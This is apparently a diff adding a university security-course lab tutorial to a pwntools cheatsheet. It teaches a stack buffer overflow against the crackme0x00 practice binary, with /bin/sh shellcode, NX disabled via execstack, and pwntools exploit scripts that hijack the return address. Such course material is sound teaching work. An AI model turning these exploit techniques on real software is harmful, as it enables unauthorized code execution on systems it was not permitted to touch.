@@ -527,3 +527,308 @@ fmt_str.execute_writes()
 ```
 
 [^ Back to top](#file-pwntools-cheatsheet-md)
+
+
+##
+##
+
+Source: https://tc.gts3.org/cs6265/2017/l/lab04/README-tut.txt
+
+====================================
+Lec04: Writing Exploits with PwnTool
+====================================
+
+
+  http://docs.pwntools.com/
+  http://docs.pwntools.com/en/stable/intro.html
+
+
+Do you remember the first crackme binary (and its password)?
+
+  $ cd tut/lab04
+  $ cp ../lab01/IOLI-crackme/crackme0x00 .
+
+If you disassembled the binary, you might see these code snippet:
+
+  $ objdump -d crackme0x00
+  ... 
+  8048448:       8d 45 e8                lea    -0x18(%ebp),%eax
+  804844b:       89 44 24 04             mov    %eax,0x4(%esp)
+  804844f:       c7 04 24 8c 85 04 08    movl   $0x804858c,(%esp)
+  8048456:       e8 d5 fe ff ff          call   8048330 <scanf@plt>
+  ...
+
+And its source code simply looks like:
+
+  main() {
+    char s1[16];
+    ...
+    scanf("%s", &s1);
+    ...
+  }
+
+By injecting a long enough input, we could hijack its control flow
+in the last tutorial, like this:
+
+    $ echo AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ > input
+    $ ./crackme0x00 < input
+    $ dmesg | tail -1
+    [238584.915883] crackme0x00[1095]: segfault at 48484848 ip 0000000048484848 sp 00000000ffffd6a0 error 14
+
+
+1. Learning PwnTool
+===================
+
+In fact, PwnTool provides a convenient way to create such an input,
+what is commonly known as a "cyclic" input.
+
+    $ cyclic 50
+    aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
+
+Given a four bytes in a sequence, we can easily locate the position
+at the input string.
+
+    $ cyclic 50 | ./crackme0x00
+    $ dmesg | tail
+    [24728.073646] crackme0x00[15085]: segfault at 61616168 ip 0000000061616168 sp 00000000ffffd6a0 error 14
+
+    $ cyclic -l 0x61616168
+    28
+
+    $ cyclic --help
+    ...
+
+Let's write a python script by using pwntools.
+
+------------------------------------------------------------
+exploit1.py
+------------------------------------------------------------
+#!/usr/bin/env python2
+
+# import all modules/commands from pwn library
+from pwn import *
+
+# set the context of the target platform
+#  arch: i386 (x86 32bit)
+#  os: linux
+context.update(arch='i386', os='linux')
+
+# create a process
+p = process("./crackme0x00")
+
+# send input to the program with a newline char, "\n"
+#  cyclic(50) provides a cyclic string with 50 chars
+p.sendline(cyclic(50))
+
+# make the process interactive, so you can interact
+# with the proces via its terminal
+p.interactive()
+------------------------------------------------------------
+
+[Task 1] Hijack its control flow to 0xdeadbeef by using
+
+   cyclic_find()
+   p32()
+
+
+2. Exploiting crackme0x00
+=========================
+
+Our plan is to invoke a shell by hijacking this control flow. Before
+doing this, let's check what kinds of security mechanisms are applied
+to that binary.
+
+  $ checksec ./crackme0x00 
+  [*] '/home/users/taesoo/tut/lab04/crackme0x00'
+      Arch:     i386-32-little
+      RELRO:    Partial RELRO
+      Stack:    No canary found
+      NX:       NX enabled
+      PIE:      No PIE (0x8048000)
+
+Do you see "NX enabled", which means that its memory space such as stack
+is not executable (W^X). We will study how to bypass this defense next
+week, so let's disable this defense.
+
+  $ execstack -s crackme0x00
+  $ checksec ./crackme0x00 
+  [*] '/home/users/taesoo/tut/lab04/crackme0x00'
+      Arch:     i386-32-little
+      RELRO:    Partial RELRO
+      Stack:    No canary found
+      NX:       NX disabled
+      PIE:      No PIE (0x8048000)
+      RWX:      Has RWX segments
+
+Our plan is to hijack its ra and jump to a shellcode.
+
+             |<-- -0x18-->|+--- ebp 
+  top                     v
+  [          [       ]   ][fp][ra][shellcode ... ]
+  |<----   0x28  ------->|     |  ^
+                               |  |
+                               +---
+
+PwnTool also provides numerous ready-to-use shellcode as well.
+
+  $ shellcraft -l
+  ...
+  i386.android.connect
+  i386.linux.sh
+  ...
+
+  $ shellcraft -f a i386.linux.sh
+    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
+    /* push '/bin///sh\x00' */
+    push 0x68
+    push 0x732f2f2f
+    push 0x6e69622f
+    mov ebx, esp
+    /* push argument array ['sh\x00'] */
+    /* push 'sh\x00\x00' */
+    push 0x1010101
+    xor dword ptr [esp], 0x1016972
+    xor ecx, ecx
+    push ecx /* null terminate */
+    push 4
+    pop ecx
+    add ecx, esp
+    push ecx /* 'sh\x00' */
+    mov ecx, esp
+    xor edx, edx
+    /* call execve() */
+    push SYS_execve /* 0xb */
+    pop eax
+    int 0x80
+
+shellcraft provides more than just this; a debugging interface (-d)
+and a test run (-r), so please check: `shellcraft --help`
+
+  $ shellcraft -d i386.linux.sh
+  $ shellcraft -r i386.linux.sh
+
+------------------------------------------------------------
+exploit2.py
+------------------------------------------------------------
+#!/usr/bin/env python2
+
+from pwn import *
+
+context.update(arch='i386', os='linux')
+
+shellcode = shellcraft.sh()
+print(shellcode)
+print(hexdump(asm(shellcode)))
+
+payload  = cyclic(cyclic_find(0x61616168))
+payload += p32(0xdeadbeef)
+payload += asm(shellcode)
+
+p = process("./crackme0x00")
+p.sendline(payload)
+p.interactive()
+------------------------------------------------------------
+
+  *asm() compiles your shellcode and provides its binary string.
+
+[Task 2] Where it should jump (i.e., where does the shellcode locate)?
+ change 0xdeadbeef to the shellcode region.
+
+Does it work? In fact, it shouldn't, but how to debug/understand this
+situation?
+
+
+3. Debugging Exploits
+=====================
+
+Gdb module (http://docs.pwntools.com/en/stable/gdb.html) provides a
+convenient way to program your debugging script.
+
+To display debugging information, you need to use terminal 
+that can split your shell into multiple screens. Since pwntools 
+supports "tmux" you can use the gdb module through tmux terminal.
+
+$ tmux
+$ ./exploit3.py
+
+------------------------------------------------------------
+exploit3.py
+------------------------------------------------------------
+#!/usr/bin/env python2
+
+from pwn import *
+
+context.update(arch='i386', os='linux')
+
+print(shellcraft.sh())
+print(hexdump(asm(shellcraft.sh())))
+
+shellcode = shellcraft.sh()
+
+payload  = cyclic(cyclic_find(0x61616168))
+payload += p32(0xdeadbeef)
+payload += asm(shellcode)
+
+p = gdb.debug("./crackme0x00", '''
+echo "hi"
+# break *0xdeadbeef
+continue
+''')
+p.sendline(payload)
+p.interactive()
+------------------------------------------------------------
+
+ *0xdeadbeef should points to the shellcode.
+
+The only difference is that "process()" is replaced with "gdb.debug()"
+and the second argument, as you guess, is the gdb script that you'd
+like to execute (e.g., setting break points).
+
+[Task 3] Where is this exploit stuck? (This may be different in your setting)
+
+     ...
+     0xffffc365:  xor    edx,edx
+     0xffffc367:  push   0x0
+     0xffffc369:  pop    esi
+  => 0xffffc36a:  div    edi
+     0xffffc36c:  add    BYTE PTR [eax],al
+     0xffffc36e:  add    BYTE PTR [eax],al
+
+The shellcode is not properly injected. Could you spot the differences
+between the above shellcode (shellcraft -f a i386.linux.sh) and what
+is injected?
+
+    ...
+    xor edx, edx
+    /* call execve() */
+    push SYS_execve /* 0xb */
+    pop eax
+    int 0x80
+
+
+3. Bypassing scanf()
+====================
+
+  $ man scanf
+
+scanf() accepting all non-white-space chars (including the NULL char!)
+but the default shellcode from pwntool contain white-space char (0xb),
+which chopped our shellcode at the end.
+
+These are white-space chars that scanf():
+
+  09, 0a, 0b, 0c, 0d, 20
+
+If you are curious, check:
+
+   $ cd scanf
+   $ make
+   ...
+
+[Task 4] Can we change your shellcode without using these chars?
+Please use exploit4.py.
+
+In fact, pwntool has more features than ones introduced in this
+simple tutorial. Please check its online manual:
+
+  http://docs.pwntools.com/
